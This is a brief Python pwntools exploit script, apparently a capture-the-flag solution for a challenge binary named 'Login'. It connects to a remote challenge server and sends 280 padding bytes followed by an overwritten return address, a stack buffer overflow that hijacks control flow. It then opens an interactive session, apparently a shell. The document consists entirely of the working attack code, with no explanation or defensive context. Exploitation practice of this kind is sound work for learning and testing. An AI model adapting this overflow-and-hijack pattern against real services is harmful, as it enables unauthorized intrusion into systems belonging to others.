from pwn import *

context.clear(arch='amd64')
#p = process("./Login_2c732764a608dfc6edcae99b3c3760c8")
p = remote("pwn1.tendollar.kr", 20200)
print p.recv()
payload = "a"*280 + p64(0x400BE8)
p.send(payload)
p.interactive()

